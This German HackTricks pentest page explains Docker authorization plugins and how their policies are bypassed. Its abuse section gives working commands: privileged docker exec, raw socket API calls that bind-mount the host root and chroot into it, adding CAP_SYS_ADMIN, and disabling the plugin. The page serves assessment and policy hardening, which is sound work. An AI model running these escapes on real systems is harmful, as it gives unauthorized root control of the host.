# Laufzeit-Autorisierungs-Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Laufzeit-Autorisierungs-Plugins sind eine zusätzliche Policy-Ebene, die entscheidet, ob ein Aufrufer eine bestimmte Aktion des Daemons durchführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jeder, der mit dem Docker daemon kommunizieren kann, faktisch weitreichende Kontrolle darüber. Autorisierungs-Plugins versuchen, dieses Modell einzuschränken, indem sie den authentifizierten Benutzer und die angeforderte API-Operation prüfen und die Anfrage gemäß der Policy erlauben oder ablehnen.

Dieses Thema verdient eine eigene Seite, weil es das Exploitationsmodell verändert, wenn ein Angreifer bereits Zugriff auf eine Docker-API oder auf einen Benutzer in der `docker`-Gruppe hat. In solchen Umgebungen lautet die Frage nicht mehr nur "can I reach the daemon?" sondern auch "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Funktionsweise

Wenn eine Anfrage den Docker daemon erreicht, kann das Autorisierungssubsystem den Anfragekontext an ein oder mehrere installierte Plugins weitergeben. Das Plugin sieht die Identität des authentifizierten Benutzers, die Anfragedetails, ausgewählte Header und Teile des Anfrage- oder Antwortkörpers, wenn der Content-Type geeignet ist. Mehrere Plugins können hintereinandergeschaltet werden, und der Zugriff wird nur gewährt, wenn alle Plugins die Anfrage erlauben.

Dieses Modell klingt stark, aber seine Sicherheit hängt vollständig davon ab, wie vollständig der Policy-Autor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Schlüssel wie das Top-Level-`Binds` übersieht oder Plugin-Administration erlaubt, kann ein falsches Sicherheitsgefühl erzeugen, während weiterhin direkte Privilege-Escalation-Pfade offenbleiben.

## Häufige Zielbereiche für Plugins

Wichtige Bereiche für die Policy-Prüfung sind:

- Endpunkte zur Container-Erstellung
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und Namespace-Sharing-Optionen
- `docker exec`-Verhalten
- Endpunkte zur Plugin-Verwaltung
- Jeder Endpunkt, der indirekt Laufzeitaktionen außerhalb des beabsichtigten Policy-Modells auslösen kann

Historisch machten Beispiele wie Twistlock's `authz`-Plugin und einfache Lehr-Plugins wie `authobot` dieses Modell leicht studierbar, weil ihre Policy-Dateien und Codepfade zeigten, wie die Zuordnung von Endpunkt zu Aktion tatsächlich implementiert war. Für Assessments ist die wichtige Lehre, dass der Policy-Autor die gesamte API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Kommandos.

## Missbrauch

Das erste Ziel ist herauszufinden, was tatsächlich blockiert wird. Wenn der daemon eine Aktion ablehnt, leaks die Fehlermeldung oft den Plugin-Namen, was hilft, die verwendete Kontrolle zu identifizieren:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Wenn Sie eine umfassendere Endpunkt-Profilierung benötigen, sind Tools wie `docker_auth_profiler` nützlich, weil sie die sonst repetitive Aufgabe automatisieren, zu prüfen, welche API-Routen und JSON-Strukturen vom plugin tatsächlich erlaubt sind.

Wenn die Umgebung ein benutzerdefiniertes plugin verwendet und Sie mit der API interagieren können, ermitteln Sie, welche Objektfelder tatsächlich gefiltert werden:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler eher feldspezifisch als konzeptuell sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die äquivalente API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt nach der Container-Erstellung Privilegien hinzu

Eine Richtlinie, die die Erstellung privilegierter Container blockiert, aber die Erstellung nicht eingeschränkter Container sowie `docker exec` erlaubt, kann dennoch umgangen werden:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Wenn der Daemon den zweiten Schritt akzeptiert, hat der Benutzer einen privilegierten interaktiven Prozess innerhalb eines Containers wiedererlangt, den der Policy-Autor für eingeschränkt hielt.

### Vollständiges Beispiel: Bind Mount über Raw API

Einige fehlerhafte Policies prüfen nur eine JSON-Form. Wenn der root filesystem bind mount nicht durchgängig blockiert wird, kann der Host trotzdem gemountet werden:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dasselbe Prinzip kann auch unter `HostConfig` auftreten:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die Auswirkung ist ein vollständiger Escape des Host-Dateisystems. Das interessante Detail ist, dass der Bypass durch unvollständige Richtlinienabdeckung entsteht und nicht durch einen Kernel-Bug.

### Vollständiges Beispiel: Ungeprüftes Capability-Attribut

Wenn die Richtlinie vergisst, ein capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability zurückerlangt:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke Capability vorhanden ist, werden viele in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschriebene breakout techniques erreichbar.

### Vollständiges Beispiel: Plugin deaktivieren

Wenn Plugin-Management-Operationen erlaubt sind, kann der sauberste bypass darin bestehen, die Kontrolle vollständig auszuschalten:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dies ist ein Policy-Fehler auf der Control-Plane-Ebene. Die Autorisierungsschicht ist vorhanden, aber der Benutzer, den sie einschränken sollte, besitzt weiterhin die Berechtigung, sie zu deaktivieren.

## Prüfungen

Diese Befehle zielen darauf ab, festzustellen, ob eine Autorisierungsschicht existiert und ob sie vollständig oder oberflächlich wirkt.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Was hier interessant ist:

- Verweigerungsnachrichten, die einen Plugin-Namen enthalten, bestätigen das Vorhandensein einer Autorisierungsschicht und geben oft die genaue Implementierung preis.
- Eine für den Angreifer sichtbare Plugin-Liste kann ausreichen, um herauszufinden, ob Operationen zum Deaktivieren oder Neukonfigurieren möglich sind.
- Eine Policy, die nur offensichtliche CLI-Aktionen blockiert, aber nicht rohe API-Anfragen, ist bis zum Beweis des Gegenteils als umgehbar zu betrachten.

## Standardwerte der Laufzeit

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Der Daemon-Zugriff ist effektiv Alles-oder-Nichts, sofern kein Autorisierungs-Plugin konfiguriert ist | unvollständige Plugin-Policy, blacklists statt allowlists, Zulassen der Plugin-Verwaltung, feldbezogene Blindstellen |
| Podman | Not a common direct equivalent | Podman verlässt sich eher auf Unix-Berechtigungen, Ausführung ohne root und Entscheidungen zur API-Exposition als auf Docker-ähnliche authz plugins | breites Exponieren einer rootfähigen Podman API, schwache Socket-Berechtigungen |
| containerd / CRI-O | Different control model | Diese Runtimes verlassen sich normalerweise auf Socket-Berechtigungen, Node-Vertrauensgrenzen und Kontrollen höherer Orchestrator-Ebenen statt auf Docker authz plugins | Einbinden des Socket in Workloads, schwache node-lokale Vertrauensannahmen |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC und admission controls sind die hauptsächliche Richtlinienebene | zu weit gefasstes RBAC, schwache admission policy, direkte Exposition von kubelet- oder Runtime-APIs |
{{#include ../../../banners/hacktricks-training.md}}
